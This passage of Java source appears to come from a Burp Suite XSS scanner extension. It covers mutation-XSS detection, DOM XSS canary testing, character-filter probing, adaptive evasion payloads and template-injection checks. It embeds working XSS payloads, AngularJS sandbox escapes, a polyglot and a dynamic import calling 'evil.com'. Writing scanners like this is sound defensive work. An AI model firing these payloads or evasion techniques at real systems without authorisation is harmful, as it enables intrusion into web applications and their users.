                                    + "the parsing round-trip.")
                            .remediation("If re-injection is necessary, sanitize the DOMParser output "
                                    + "with DOMPurify.sanitize() before assigning to innerHTML.")
                            .requestResponse(reqResp)
                            .responseEvidence(dpMatcher.group())
                            .build());
                    reported.add(key);
                }
            }
        }

        // Pattern 4: DOMPurify with RETURN_DOM followed by innerHTML
        if (script.contains("DOMPurify") && script.contains("RETURN_DOM")) {
            Pattern purifyDomPattern = Pattern.compile(
                    "DOMPurify\\.sanitize\\s*\\([^)]*RETURN_DOM[^)]*\\)");
            Matcher pdMatcher = purifyDomPattern.matcher(script);
            while (pdMatcher.find()) {
                int afterIdx = pdMatcher.end();
                String after = script.substring(afterIdx,
                        Math.min(script.length(), afterIdx + 300));
                if (after.contains(".innerHTML")) {
                    String key = "mxss|dompurify-returndom|" + pdMatcher.start();
                    if (reported.contains(key)) continue;

                    String context = extractContext(script, pdMatcher.start(),
                            afterIdx + after.indexOf(".innerHTML") + 10);

                    findings.add(Finding.builder("xss-scanner",
                                    "Mutation XSS: DOMPurify RETURN_DOM → innerHTML",
                                    Severity.MEDIUM, Confidence.TENTATIVE)
                            .url(url)
                            .evidence("DOMPurify.sanitize with RETURN_DOM, then .innerHTML access"
                                    + "\nContext:\n" + context)
                            .description("DOMPurify.sanitize() with {RETURN_DOM: true} returns a DOM node. "
                                    + "Calling .innerHTML on this node re-serializes the sanitized DOM, "
                                    + "which may produce different HTML than what DOMPurify validated, "
                                    + "potentially creating mutation XSS vectors.")
                            .remediation("Use DOMPurify.sanitize() with default options (returns string) "
                                    + "and assign directly to innerHTML. Avoid RETURN_DOM → innerHTML chains.")
                            .requestResponse(reqResp)
                            .responseEvidence(pdMatcher.group())
                            .build());
                    reported.add(key);
                }
            }
        }

        // Pattern 5: jQuery .html() round-trip
        Matcher jqRtMatcher = MXSS_JQUERY_ROUNDTRIP.matcher(script);
        while (jqRtMatcher.find()) {
            String key = "mxss|jquery-roundtrip|" + jqRtMatcher.start();
            if (reported.contains(key)) continue;

            String context = extractContext(script, jqRtMatcher.start(), jqRtMatcher.end());

            findings.add(Finding.builder("xss-scanner",
                            "Mutation XSS: jQuery .html() Round-Trip",
                            Severity.MEDIUM, Confidence.TENTATIVE)
                    .url(url)
                    .evidence("Pattern: " + jqRtMatcher.group() + "\nContext:\n" + context)
                    .description("jQuery's .html() is used to read HTML from one element and write it "
                            + "to another. jQuery's internal HTML serialization may differ from the "
                            + "browser's native serialization, creating mutation XSS vectors.")
                    .remediation("Use .text() for safe text transfer. If HTML transfer is needed, "
                            + "sanitize with DOMPurify.sanitize() between .html() read and write.")
                    .requestResponse(reqResp)
                    .responseEvidence(jqRtMatcher.group())
                    .build());
            reported.add(key);
        }
    }

    // ==================== ACTIVE: DOM XSS TESTING ====================

    /**
     * Active DOM XSS testing: injects canary into URL parameters and checks
     * if it appears inside script blocks near dangerous sinks.
     */
    private void testActiveDomXss(HttpRequestResponse original, XssTarget target) throws InterruptedException {
        String url = original.request().url();

        // Inject DOM canary into the parameter
        HttpRequestResponse canaryResult = sendPayload(original, target, DOM_CANARY);
        if (canaryResult == null || canaryResult.response() == null) return;

        String responseBody = canaryResult.response().bodyToString();
        if (!responseBody.contains(DOM_CANARY)) return;

        // Check if canary appears inside a <script> block
        List<String> scriptBlocks = extractScriptBlocks(responseBody, "text/html");
        for (String script : scriptBlocks) {
            if (!script.contains(DOM_CANARY)) continue;

            // Canary is reflected inside JavaScript — check context
            api.logging().logToOutput("[XSS] DOM canary reflected in script block for param '"
                    + target.name + "'");

            // Check if canary is near any sink
            for (String sink : DOM_SINKS_ALL) {
                int canaryIdx = script.indexOf(DOM_CANARY);
                int sinkIdx = script.indexOf(sink);
                if (canaryIdx >= 0 && sinkIdx >= 0 && Math.abs(canaryIdx - sinkIdx) < 500) {
                    // Check if canary is in a variable assignment
                    String beforeCanary = script.substring(Math.max(0, canaryIdx - 100), canaryIdx);
                    boolean inAssignment = beforeCanary.matches("(?s).*(?:var|let|const)\\s+\\w+\\s*=\\s*[\"']?$")
                            || beforeCanary.matches("(?s).*=\\s*[\"']?$");

                    boolean sanitized = isSanitized(
                            script.substring(Math.max(0, Math.min(canaryIdx, sinkIdx) - 50),
                                    Math.min(script.length(), Math.max(canaryIdx, sinkIdx) + 50)));

                    Severity sev = sanitized ? Severity.MEDIUM : Severity.HIGH;
                    String context = extractContext(script, Math.min(canaryIdx, sinkIdx),
                            Math.max(canaryIdx + DOM_CANARY.length(), sinkIdx + sink.length()));

                    findingsStore.addFinding(Finding.builder("xss-scanner",
                                    "DOM XSS: Reflected Parameter in Script Block Near Sink"
                                            + (sanitized ? " (sanitizer detected)" : ""),
                                    sev, sanitized ? Confidence.TENTATIVE : Confidence.FIRM)
                            .url(url)
                            .parameter(target.name)
                            .evidence("Param '" + target.name + "' reflected in <script> block near sink '" + sink + "'"
                                    + "\nIn assignment: " + inAssignment
                                    + (sanitized ? "\nSanitizer detected" : "")
                                    + "\nContext:\n" + context)
                            .description("URL parameter '" + target.name + "' is reflected inside a JavaScript "
                                    + "block and appears near the dangerous sink '" + sink + "'. "
                                    + (inAssignment ? "The value is assigned to a variable that may flow to the sink. "
                                    : "")
                                    + "An attacker can potentially control JavaScript execution via this parameter.")
                            .remediation("Encode user input before embedding in JavaScript contexts. "
                                    + "Use JSON.stringify() for values inside JS strings.")
                            .requestResponse(canaryResult)
                            .payload(DOM_CANARY)
                            .responseEvidence(DOM_CANARY)
                            .build());
                    return; // One finding per parameter
                }
            }

            // Even without a nearby sink, reflection in JS is noteworthy
            findingsStore.addFinding(Finding.builder("xss-scanner",
                            "Parameter Reflected in JavaScript Block",
                            Severity.MEDIUM, Confidence.TENTATIVE)
                    .url(url)
                    .parameter(target.name)
                    .evidence("Param '" + target.name + "' canary found inside <script> block")
                    .description("URL parameter '" + target.name + "' value is reflected inside a "
                            + "JavaScript block. While no direct sink was found nearby, this may enable "
                            + "DOM XSS if the value flows to a sink elsewhere in the code.")
                    .requestResponse(canaryResult)
                    .payload(DOM_CANARY)
                    .responseEvidence(DOM_CANARY)
                    .build());
        }
    }

    // ==================== DOM XSS HELPER METHODS ====================

    /** Checks if any known sanitizer is present in the given code region. */
    private boolean isSanitized(String region) {
        for (String san : SANITIZERS) {
            if (region.contains(san)) return true;
        }
        return false;
    }

    /** Returns severity based on sink type. */
    private Severity getSinkSeverity(String sink) {
        for (String s : DOM_SINKS_EXEC) if (sink.equals(s)) return Severity.CRITICAL;
        for (String s : DOM_SINKS_HTML) if (sink.equals(s)) return Severity.HIGH;
        for (String s : DOM_SINKS_URL) if (sink.equals(s)) return Severity.HIGH;
        for (String s : DOM_SINKS_JQUERY) if (sink.equals(s)) return Severity.MEDIUM;
        return Severity.MEDIUM;
    }

    /** Returns confidence based on source risk level. */
    private Confidence getSourceConfidence(String source) {
        for (String s : DOM_SOURCES_HIGH) if (source.equals(s)) return Confidence.FIRM;
        return Confidence.TENTATIVE;
    }

    /** Extracts surrounding context for evidence display. */
    private String extractContext(String script, int start, int end) {
        int ctxStart = Math.max(0, start - 80);
        int ctxEnd = Math.min(script.length(), end + 80);
        String ctx = script.substring(ctxStart, ctxEnd).trim();
        if (ctx.length() > 400) ctx = ctx.substring(0, 400);
        return (ctxStart > 0 ? "..." : "") + ctx + (ctxEnd < script.length() ? "..." : "");
    }

    /** Extracts content inside parentheses starting from the given position. */
    private String extractParenContent(String script, int startIdx) {
        int openParen = script.indexOf('(', startIdx);
        if (openParen < 0 || openParen > startIdx + 50) return "";

        int depth = 1;
        int i = openParen + 1;
        while (i < script.length() && depth > 0) {
            char c = script.charAt(i);
            if (c == '(') depth++;
            else if (c == ')') depth--;
            i++;
        }
        if (depth != 0) return "";
        return script.substring(openParen + 1, i - 1);
    }

    /** Extracts a function body starting from an opening brace. */
    private String extractFunctionBody(String script, int braceStart) {
        if (braceStart >= script.length()) return "";
        int depth = 1;
        int i = braceStart + 1;
        int maxLen = Math.min(script.length(), braceStart + 2000);
        while (i < maxLen && depth > 0) {
            char c = script.charAt(i);
            if (c == '{') depth++;
            else if (c == '}') depth--;
            i++;
        }
        if (depth != 0) return script.substring(braceStart, Math.min(script.length(), braceStart + 1000));
        return script.substring(braceStart, i);
    }

    /** Checks if two strings appear within the same code block (between matching braces). */
    private boolean areSameBlock(String script, String a, String b) {
        int aIdx = script.indexOf(a);
        int bIdx = script.indexOf(b);
        if (aIdx < 0 || bIdx < 0) return false;
        return Math.abs(aIdx - bIdx) < 500;
    }

    // ==================== SMART CHARACTER FILTER PROBING (Improvement 1) ====================

    /**
     * Probes which XSS-relevant characters survive server-side filtering.
     * Sends CANARY + CHAR_PROBE and checks which characters appear in the response.
     * Returns a map of character → survived (true/false).
     */
    private Map<Character, Boolean> probeCharacterFiltering(HttpRequestResponse original,
                                                             XssTarget target) throws InterruptedException {
        Map<Character, Boolean> survival = new LinkedHashMap<>();
        String probePayload = CANARY + CHAR_PROBE;

        HttpRequestResponse result = sendPayload(original, target, probePayload);
        if (result == null || result.response() == null) {
            // If probe fails, assume all chars pass (fall back to original behavior)
            for (char c : CHAR_PROBE.toCharArray()) survival.put(c, true);
            return survival;
        }

        String body = result.response().bodyToString();
        int canaryIdx = body.indexOf(CANARY);
        if (canaryIdx < 0) {
            // Canary not found — shouldn't happen since we checked earlier
            for (char c : CHAR_PROBE.toCharArray()) survival.put(c, true);
            return survival;
        }

        // Check the region after the canary for surviving characters
        String afterCanary = body.substring(canaryIdx + CANARY.length(),
                Math.min(body.length(), canaryIdx + CANARY.length() + CHAR_PROBE.length() + 50));

        for (char c : CHAR_PROBE.toCharArray()) {
            survival.put(c, afterCanary.indexOf(c) >= 0);
        }

        // Log results
        StringBuilder pass = new StringBuilder();
        StringBuilder block = new StringBuilder();
        for (Map.Entry<Character, Boolean> e : survival.entrySet()) {
            if (e.getValue()) pass.append(e.getKey());
            else block.append(e.getKey());
        }
        api.logging().logToOutput("[XSS] Filter probe: PASS=[" + pass + "] BLOCK=[" + block
                + "] for param '" + target.name + "'");

        return survival;
    }

    /**
     * Checks if a payload is viable given the character survival map.
     * Returns false if the payload uses any blocked character.
     */
    private boolean payloadViableWithChars(String payload, Map<Character, Boolean> charSurvival) {
        for (Map.Entry<Character, Boolean> entry : charSurvival.entrySet()) {
            if (!entry.getValue() && payload.indexOf(entry.getKey()) >= 0) {
                return false;
            }
        }
        return true;
    }

    /**
     * Generates adaptive evasion payloads based on which characters survive filtering.
     * Returns payloads specifically designed to work with the available character set.
     */
    private List<String[]> generateAdaptiveEvasions(Map<Character, Boolean> charSurvival) {
        List<String[]> evasions = new ArrayList<>();
        boolean ltPass = charSurvival.getOrDefault('<', false);
        boolean gtPass = charSurvival.getOrDefault('>', false);
        boolean dqPass = charSurvival.getOrDefault('"', false);
        boolean sqPass = charSurvival.getOrDefault('\'', false);
        boolean parenPass = charSurvival.getOrDefault('(', false);
        boolean eqPass = charSurvival.getOrDefault('=', false);
        boolean backPass = charSurvival.getOrDefault('`', false);
        boolean slashPass = charSurvival.getOrDefault('/', false);
        boolean bracePass = charSurvival.getOrDefault('{', false);

        // Parentheses blocked → use backtick call syntax
        if (!parenPass && backPass) {
            if (ltPass && gtPass) {
                evasions.add(new String[]{"<img src=x onerror=alert`1`>", "onerror=alert", "Backtick call (parens blocked)"});
                evasions.add(new String[]{"<svg onload=alert`1`>", "onload=alert", "SVG backtick call"});
            }
        }

        // Parentheses blocked → use entity-encoded parentheses in event handler
        if (!parenPass && ltPass && gtPass && eqPass) {
            evasions.add(new String[]{"<img src=x onerror=alert&lpar;1&rpar;>", "onerror=alert", "Entity-encoded parens"});
            evasions.add(new String[]{"<img src=x onerror=alert&#40;1&#41;>", "onerror=alert", "Numeric entity parens"});
        }

        // Angle brackets blocked → encoded variants (double-decode check)
        if (!ltPass || !gtPass) {
            evasions.add(new String[]{"%3Cscript%3Ealert(1)%3C/script%3E", "alert(1)", "URL-encoded angle brackets"});
            evasions.add(new String[]{"&#60;script&#62;alert(1)&#60;/script&#62;", "alert(1)", "HTML entity angle brackets"});
            evasions.add(new String[]{"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", "alert(1)", "Unicode escape brackets"});
        }

        // Both quotes blocked → unquoted attribute payloads
        if (!dqPass && !sqPass && ltPass && gtPass && eqPass) {
            evasions.add(new String[]{"<img src=x onerror=alert(1)>", "onerror=alert", "Unquoted attribute (quotes blocked)"});
            evasions.add(new String[]{"<input onfocus=alert(1) autofocus>", "onfocus=alert", "Autofocus unquoted"});
        }

        // Angle brackets blocked → JS-context-only expression injection
        if (!ltPass && !gtPass) {
            if (dqPass) {
                evasions.add(new String[]{"\"-alert(1)-\"", "alert(1)", "JS expression injection (dquote, no brackets)"});
                evasions.add(new String[]{"\";alert(1)//", "alert(1)", "JS breakout semicolon (no brackets)"});
            }
            if (sqPass) {
                evasions.add(new String[]{"'-alert(1)-'", "alert(1)", "JS expression injection (squote, no brackets)"});
                evasions.add(new String[]{"';alert(1)//", "alert(1)", "JS breakout semicolon squote (no brackets)"});
            }
            if (backPass && bracePass) {
                evasions.add(new String[]{"${alert(1)}", "alert(1)", "Template literal injection (no brackets)"});
            }
        }

        // Everything blocked except backtick and slash
        if (!ltPass && !gtPass && !dqPass && !sqPass && !parenPass && backPass) {
            evasions.add(new String[]{"`${alert`1`}`", "alert", "Backtick-only payload"});
        }

        // Fallback: if angle brackets pass but quotes/parens are restricted
        if (ltPass && gtPass && !parenPass && !backPass) {
            evasions.add(new String[]{"<details open ontoggle=import('//evil.com')>", "ontoggle=", "Dynamic import (no parens/backticks)"});
        }

        // If most chars pass, add polyglot
        if (ltPass && gtPass && (dqPass || sqPass)) {
            evasions.add(new String[]{"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
                    "alert()", "XSS polyglot (adaptive)"});
        }

        return evasions;
    }

    // ==================== ACTIVE: REFLECTED XSS ====================

    private void testReflectedXss(HttpRequestResponse original, XssTarget target) throws InterruptedException {
        String url = original.request().url();

        // Step 1: Inject canary to find reflection
        api.logging().logToOutput("[XSS] Step 1: Testing param '" + target.name + "' with canary on " + url);

        HttpRequestResponse canaryResult = sendPayload(original, target, CANARY);
        if (canaryResult == null) {
            api.logging().logToError("[XSS] Canary request returned NULL for param '" + target.name + "' — sendPayload failed");
            return;
        }
        if (canaryResult.response() == null) {
            api.logging().logToError("[XSS] Canary response is NULL for param '" + target.name + "'");
            return;
        }

        String canaryBody = canaryResult.response().bodyToString();
        if (!canaryBody.contains(CANARY)) {
            api.logging().logToOutput("[XSS] Canary NOT reflected for param '" + target.name + "' — skipping");
            return;
        }

        // Step 2: Identify reflection context
        String context = identifyContext(canaryBody, CANARY);
        api.logging().logToOutput("[XSS] Reflection found for param '" + target.name + "' in context: " + context);

        // Detect frontend frameworks for targeted payloads later
        Set<String> detectedFrameworks = config.getBool("xss.frameworkXss.enabled", true)
                ? detectFrameworks(canaryResult) : Collections.emptySet();

        findingsStore.addFinding(Finding.builder("xss-scanner",
                        "XSS: Input reflected in " + context + " context",
                        Severity.INFO, Confidence.CERTAIN)
                .url(url).parameter(target.name)
                .evidence("Canary '" + CANARY + "' reflected in " + context + " context")
                .description("User input is reflected in the response. Testing context-specific payloads.")
                .requestResponse(canaryResult)
                .payload(CANARY)
                .responseEvidence(CANARY)
                .build());

        // Step 3: Smart character filter probing (Improvement 1)
        Map<Character, Boolean> charSurvival = probeCharacterFiltering(original, target);
        perHostDelay();

        // Check if ALL XSS-relevant characters are filtered
        boolean allBlocked = true;
        for (boolean survived : charSurvival.values()) {
            if (survived) { allBlocked = false; break; }
        }
        if (allBlocked) {
            findingsStore.addFinding(Finding.builder("xss-scanner",
                            "XSS: All XSS-relevant characters filtered",
                            Severity.INFO, Confidence.FIRM)
                    .url(url).parameter(target.name)
                    .evidence("All characters in probe '" + CHAR_PROBE + "' were stripped/encoded")
                    .description("Parameter '" + target.name + "' reflects input but all XSS-relevant "
                            + "characters are filtered. Standard XSS payloads are unlikely to work.")
                    .requestResponse(canaryResult)
                    .payload(CHAR_PROBE)
                    .build());
            // Still try encoding-based and header injection tests
            if (config.getBool("xss.encodingXss.enabled", true)) {
                testEncodingXss(original, target, url);
            }
            if (config.getBool("xss.headerInjection.enabled", true)) {
                testHeaderReflectionXss(original, target, url);
            }
            return;
        }

        // Step 4: Send context-specific payloads (filtered by char survival)
        String[][] payloads = CONTEXT_PAYLOADS.get(context);
        if (payloads == null) payloads = CONTEXT_PAYLOADS.get("HTML_BODY"); // Default

        boolean contextPayloadWorked = false;
        for (String[] payload : payloads) {
            String xssPayload = payload[0];
            String checkFor = payload[1];
            String desc = payload[2];

            // Skip payloads that use blocked characters (Improvement 1)
            if (!payloadViableWithChars(xssPayload, charSurvival)) {
                api.logging().logToOutput("[XSS] Skipping payload '" + desc + "' — uses blocked chars");
                continue;
            }

            HttpRequestResponse result = sendPayload(original, target, xssPayload);
            if (result == null || result.response() == null) continue;

            String body = result.response().bodyToString();

            // Check if the payload or its key marker survived in the response
            // But skip if the marker was already present in the baseline (canary) response
            if (!checkFor.isEmpty() && body.contains(checkFor) && !canaryBody.contains(checkFor)) {
                ReflectionVerdict verdict = validateExecutableContext(result, xssPayload, checkFor);
                if (verdict == ReflectionVerdict.ENCODED) {
                    api.logging().logToOutput("[XSS] Skipping — payload HTML-encoded for param '" + target.name + "'");
                    continue;
                }

                Severity sev = Severity.HIGH;
                String verdictNote = "";
                if (verdict == ReflectionVerdict.NON_HTML_CONTENT_TYPE) {
                    sev = Severity.INFO;
                    verdictNote = " | Reflected in non-HTML response (Content-Type not text/html)";
                } else if (verdict == ReflectionVerdict.DEAD_CONTAINER) {
                    sev = Severity.INFO;
                    verdictNote = " | Reflected inside non-executable container";
                } else if (verdict == ReflectionVerdict.CSP_RESTRICTED) {
                    sev = downgradeSeverity(Severity.HIGH);
                    verdictNote = " | CSP script-src restricts inline execution — exploitation requires CSP bypass";
                }

                findingsStore.addFinding(Finding.builder("xss-scanner",
                                "XSS Confirmed: " + desc + " in " + context,
                                sev, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + xssPayload + " | Marker '" + checkFor + "' found in response" + verdictNote)
                        .description("Reflected XSS via " + desc + ". Context: " + context + ".")
                        .requestResponse(result)
                        .payload(xssPayload)
                        .responseEvidence(checkFor)
                        .build());
                return; // XSS confirmed, stop testing this param
            }
            perHostDelay();
        }

        // Step 5: Try adaptive evasion payloads based on char survival (Improvement 1)
        if (config.getBool("xss.evasion.enabled", true)) {
            testFilterEvasion(original, target, url, context, charSurvival, canaryBody);
        }

        // Step 6: Client-side template injection (Improvement 2)
        if (config.getBool("xss.csti.enabled", true)) {
            testTemplateInjection(original, target, url, canaryBody);
        }

        // Step 6.5: Framework-specific XSS payloads
        if (config.getBool("xss.frameworkXss.enabled", true) && !detectedFrameworks.isEmpty()) {
            testFrameworkSpecificXss(original, target, url, detectedFrameworks, charSurvival, canaryBody);
        }

        // Step 7: Encoding negotiation XSS (Improvement 6)
        if (config.getBool("xss.encodingXss.enabled", true)) {
            testEncodingXss(original, target, url);
        }

        // Step 8: Response header injection XSS (Improvement 7)
        if (config.getBool("xss.headerInjection.enabled", true)) {
            testHeaderReflectionXss(original, target, url);
        }

        // Step 9: Blind XSS via Collaborator
        if (config.getBool("xss.blindOob.enabled", true)
                && collaboratorManager != null && collaboratorManager.isAvailable()) {
            testBlindXss(original, target, url);
        }
    }

    private void testFilterEvasion(HttpRequestResponse original, XssTarget target,
                                    String url, String context,
                                    Map<Character, Boolean> charSurvival,
                                    String canaryBody) throws InterruptedException {
        // First: try static evasion payloads, skipping those using blocked chars
        for (String[] evasion : EVASION_PAYLOADS) {
            String payload = evasion[0];
            String checkFor = evasion[1];
            String technique = evasion[2];

            // Skip payloads that use blocked characters (Improvement 1)
            if (!payloadViableWithChars(payload, charSurvival)) continue;

            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            String body = result.response().bodyToString();

            // Skip if marker already existed in baseline response
            if (!checkFor.isEmpty() && body.contains(checkFor) && !canaryBody.contains(checkFor)) {
                ReflectionVerdict verdict = validateExecutableContext(result, payload, checkFor);
                if (verdict == ReflectionVerdict.ENCODED) {
                    api.logging().logToOutput("[XSS] Skipping evasion — payload HTML-encoded for param '" + target.name + "'");
                    continue;
                }

                Severity sev = Severity.HIGH;
                String verdictNote = "";
                if (verdict == ReflectionVerdict.NON_HTML_CONTENT_TYPE) {
                    sev = Severity.INFO;
                    verdictNote = " | Reflected in non-HTML response";
                } else if (verdict == ReflectionVerdict.DEAD_CONTAINER) {
                    sev = Severity.INFO;
                    verdictNote = " | Reflected inside non-executable container";
                } else if (verdict == ReflectionVerdict.CSP_RESTRICTED) {
                    sev = downgradeSeverity(Severity.HIGH);
                    verdictNote = " | CSP restricts inline execution";
                }

                findingsStore.addFinding(Finding.builder("xss-scanner",
                                "XSS via Filter Evasion: " + technique,
                                sev, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("Evasion technique: " + technique + " | Payload: " + payload + verdictNote)
                        .description("XSS filter bypassed using " + technique + ". Context: " + context + ".")
                        .requestResponse(result)
                        .payload(payload)
                        .responseEvidence(checkFor)
                        .build());
                return;
            }
            perHostDelay();
        }

        // Second: try adaptive evasion payloads generated from char survival analysis
        List<String[]> adaptiveEvasions = generateAdaptiveEvasions(charSurvival);
        api.logging().logToOutput("[XSS] Generated " + adaptiveEvasions.size()
                + " adaptive evasion payloads for param '" + target.name + "'");

        for (String[] evasion : adaptiveEvasions) {
            String payload = evasion[0];
            String checkFor = evasion[1];
            String technique = evasion[2];

            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            String body = result.response().bodyToString();

            // Skip if marker already existed in baseline response
            if (!checkFor.isEmpty() && body.contains(checkFor) && !canaryBody.contains(checkFor)) {
                ReflectionVerdict verdict = validateExecutableContext(result, payload, checkFor);
                if (verdict == ReflectionVerdict.ENCODED) {
                    api.logging().logToOutput("[XSS] Skipping adaptive evasion — payload HTML-encoded for param '" + target.name + "'");
                    continue;
                }

                Severity sev = Severity.HIGH;
                String verdictNote = "";
                if (verdict == ReflectionVerdict.NON_HTML_CONTENT_TYPE) {
                    sev = Severity.INFO;
                    verdictNote = " | Reflected in non-HTML response";
                } else if (verdict == ReflectionVerdict.DEAD_CONTAINER) {
                    sev = Severity.INFO;
                    verdictNote = " | Reflected inside non-executable container";
                } else if (verdict == ReflectionVerdict.CSP_RESTRICTED) {
                    sev = downgradeSeverity(Severity.HIGH);
                    verdictNote = " | CSP restricts inline execution";
                }

                findingsStore.addFinding(Finding.builder("xss-scanner",
                                "XSS via Adaptive Evasion: " + technique,
                                sev, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("Adaptive evasion: " + technique + " | Payload: " + payload
                                + " | Based on char filter analysis" + verdictNote)
                        .description("XSS filter bypassed using adaptive payload '" + technique
                                + "' generated from character filter analysis. Context: " + context + ".")
                        .requestResponse(result)
                        .payload(payload)
                        .responseEvidence(checkFor)
                        .build());
                return;
            }
            perHostDelay();
        }
    }

    // ==================== CLIENT-SIDE TEMPLATE INJECTION (Improvement 2) ====================

    /**
     * Tests for Client-Side Template Injection (CSTI) in AngularJS, Vue, and similar frameworks.
     * Sends template expressions and checks if they are evaluated (e.g., {{7*7}} → 49).
     */
    private void testTemplateInjection(HttpRequestResponse original, XssTarget target,
                                        String url, String canaryBody) throws InterruptedException {
        String[][] cstiPayloads = {
                {"{{7*7}}", "49", "{{7*7}}", "AngularJS/Vue template expression"},
                {"{{constructor.constructor('alert(1)')()}}", "alert(1)", "{{constructor", "AngularJS sandbox escape (< 1.6)"},
                {"{{$on.constructor('alert(1)')()}}", "alert(1)", "{{$on", "AngularJS sandbox escape (alt)"},
                {"${7*7}", "49", "${7*7}", "JS template literal / Pebble / Freemarker"},
                {"<%= 7*7 %>", "49", "<%= 7*7", "EJS/ERB template"},
                {"#{7*7}", "49", "#{7*7}", "Pug/Jade template"},
        };

        for (String[] entry : cstiPayloads) {
            String payload = entry[0];
            String evalResult = entry[1];
            String templateSyntax = entry[2];
            String desc = entry[3];

            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            String body = result.response().bodyToString();

            // CSTI is confirmed if the expression was EVALUATED (result present)
            // but the template syntax itself is NOT present (it was processed)
            // AND the eval result was NOT already in the baseline response (e.g., "49" as a price)
            boolean resultPresent = body.contains(evalResult);
            boolean syntaxPresent = body.contains(templateSyntax);
            boolean resultInBaseline = canaryBody != null && canaryBody.contains(evalResult);

            if (resultPresent && !syntaxPresent && !resultInBaseline) {
                findingsStore.addFinding(Finding.builder("xss-scanner",
                                "Client-Side Template Injection (CSTI): " + desc,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + payload + " | Evaluated to: " + evalResult
                                + " | Template syntax '" + templateSyntax + "' was processed (not reflected raw)")
                        .description("Client-side template injection detected via " + desc + ". "
                                + "The template expression '" + payload + "' was evaluated by the client-side "
                                + "template engine, producing '" + evalResult + "'. An attacker can inject "
                                + "arbitrary template expressions to achieve XSS.")
                        .remediation("Avoid injecting user input into template expressions. Use safe bindings "
                                + "(e.g., ng-bind in AngularJS, {{ }} with v-text in Vue). Upgrade AngularJS "
                                + "to Angular (2+) which has stricter sandbox.")
                        .requestResponse(result)
                        .payload(payload)
                        .responseEvidence(evalResult)
                        .build());
                return; // CSTI confirmed
            }

            // Also check for partial evaluation (template syntax gone but result not exactly matching)
            if (!syntaxPresent && body.contains(CANARY)) {
                // Template syntax was consumed — possible CSTI even if eval result differs
                findingsStore.addFinding(Finding.builder("xss-scanner",
                                "Possible CSTI: Template Syntax Consumed — " + desc,
                                Severity.MEDIUM, Confidence.TENTATIVE)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + payload + " | Template syntax '" + templateSyntax
                                + "' was consumed (not reflected)")
                        .description("The template expression '" + payload + "' was consumed by what appears "
                                + "to be a client-side template engine (" + desc + "). The exact evaluation "
                                + "result was not detected, but the syntax was processed, suggesting CSTI potential.")
                        .requestResponse(result)
                        .payload(payload)
                        .build());
            }
            perHostDelay();
        }
    }

    // ==================== FRAMEWORK-SPECIFIC XSS TESTING ====================

    /**
     * Detects frontend frameworks present in the response body/headers. Cached per host.
     */
    private Set<String> detectFrameworks(HttpRequestResponse response) {
        String host = extractHost(response.request().url());
        if (frameworkCachePerHost.containsKey(host)) {
            return frameworkCachePerHost.get(host);
        }

        Set<String> frameworks = new LinkedHashSet<>();
        String body = "";
        try {
            if (response.response() != null) {
                body = response.response().bodyToString();
            }
        } catch (Exception e) {
            // If body can't be read, return empty
        }
        if (body == null) body = "";

        // Also check response headers (e.g., X-Powered-By, Server)
        String allHeaders = "";
        if (response.response() != null) {
            StringBuilder hb = new StringBuilder();
            for (var h : response.response().headers()) {
                hb.append(h.name()).append(": ").append(h.value()).append("\n");
            }
            allHeaders = hb.toString();
        }
        String combined = body + "\n" + allHeaders;

        // AngularJS (1.x) — must check BEFORE Angular (2+) since Angular also uses 'ng-'
        boolean hasAngularModern = containsAny(combined, "ng-version=", "_nghost-", "_ngcontent-",
                "@angular/core", "ng-star-inserted");
        boolean hasAngularJS = containsAny(combined, "ng-app", "ng-controller", "angular.module",
                "angular.min.js", "$scope");

        if (hasAngularJS && !hasAngularModern) {
            frameworks.add("ANGULARJS");
        }
        if (hasAngularModern) {
            frameworks.add("ANGULAR");
        }

        // Vue.js
        if (containsAny(combined, "v-cloak", "data-v-", "Vue.createApp", "vue.min.js",
                "v-bind:", "v-on:", "v-model")) {
            frameworks.add("VUE");
        }

        // React / Next.js
        if (containsAny(combined, "data-reactroot", "__NEXT_DATA__", "_reactRootContainer",
                "react.production.min.js", "ReactDOM.render")) {
            frameworks.add("REACT");
        }

        // jQuery
        if (containsAny(combined, "jQuery", "jquery.min.js", "$.fn.", "$(document).ready")) {
            frameworks.add("JQUERY");
        }

        frameworkCachePerHost.put(host, frameworks);
        api.logging().logToOutput("[XSS] Framework detection for host " + host + ": " + frameworks);
        return frameworks;
    }

    /**
     * Extracts host from a URL string.
     */
    private String extractHost(String url) {
        try {
            if (url.contains("://")) {
                String afterScheme = url.substring(url.indexOf("://") + 3);
                int slashIdx = afterScheme.indexOf('/');
                return slashIdx >= 0 ? afterScheme.substring(0, slashIdx) : afterScheme;
            }
        } catch (Exception ignored) {}
        return url;
    }

    /**
     * Returns true if the text contains any of the given markers (case-sensitive).
     */
    private boolean containsAny(String text, String... markers) {
        for (String m : markers) {
            if (text.contains(m)) return true;
        }
        return false;
    }

    /**
     * Tests framework-specific XSS payloads based on detected frameworks.
     * Respects character survival filtering and reports findings with framework context.
     */
    private void testFrameworkSpecificXss(HttpRequestResponse original, XssTarget target,
                                           String url, Set<String> frameworks,
                                           Map<Character, Boolean> charSurvival,
                                           String canaryBody) throws InterruptedException {
        // Map framework names to their payload arrays
        Map<String, String[][]> frameworkPayloads = new LinkedHashMap<>();
        for (String fw : frameworks) {
            switch (fw) {
                case "ANGULARJS": frameworkPayloads.put("AngularJS", ANGULARJS_PAYLOADS); break;
                case "ANGULAR":   frameworkPayloads.put("Angular", ANGULAR_PAYLOADS); break;
                case "VUE":       frameworkPayloads.put("Vue.js", VUE_PAYLOADS); break;
                case "REACT":     frameworkPayloads.put("React", REACT_PAYLOADS); break;
                case "JQUERY":    frameworkPayloads.put("jQuery", JQUERY_PAYLOADS); break;
            }
        }

        for (Map.Entry<String, String[][]> entry : frameworkPayloads.entrySet()) {
            String fwName = entry.getKey();
            String[][] payloads = entry.getValue();

            api.logging().logToOutput("[XSS] Testing " + payloads.length + " " + fwName
